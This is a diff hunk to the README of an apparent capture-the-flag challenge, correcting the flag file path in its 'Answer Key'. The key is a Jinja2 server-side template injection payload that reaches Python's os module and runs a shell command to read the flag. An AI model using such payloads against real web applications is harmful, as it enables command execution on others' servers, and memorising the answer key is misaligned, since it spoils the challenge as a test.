@@ -15,4 +15,4 @@ docker run -e FLAG="CTF{test_flag}" -p 5000:5000 ctf-proto
 ```
 
 ## Answer Key
-{{config.__class__.__init__.__globals__['os'].popen('cat flag/flag.txt').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('cat /flag/flag.txt').read()}}
